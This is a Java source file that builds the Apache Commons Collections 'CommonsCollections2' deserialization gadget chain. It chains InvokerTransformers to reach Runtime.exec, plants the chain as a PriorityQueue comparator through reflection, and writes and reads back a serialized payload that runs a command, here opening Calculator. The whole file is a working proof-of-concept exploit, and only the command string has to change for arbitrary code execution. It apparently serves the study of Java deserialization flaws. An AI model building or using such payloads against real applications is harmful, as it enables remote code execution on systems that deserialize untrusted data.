import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CommonsCollections2_1 {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException, IOException {
        ChainedTransformer chain = new ChainedTransformer(
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", null}
                ),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, null}
                ),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new Object[]{"open -a Calculator.app"}
                )
        );

        TransformingComparator transformingComparator = new TransformingComparator(chain);
        PriorityQueue<String> priorityQueue = new PriorityQueue<>(2);
        priorityQueue.add("1");
        priorityQueue.add("2");

        Field f = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
        f.setAccessible(true);
        f.set(priorityQueue,transformingComparator);

        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("CommonsCollections2.1.bin"));
        objectOutputStream.writeObject(priorityQueue);
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("CommonsCollections2.1.bin"));
        objectInputStream.readObject();
    }
}
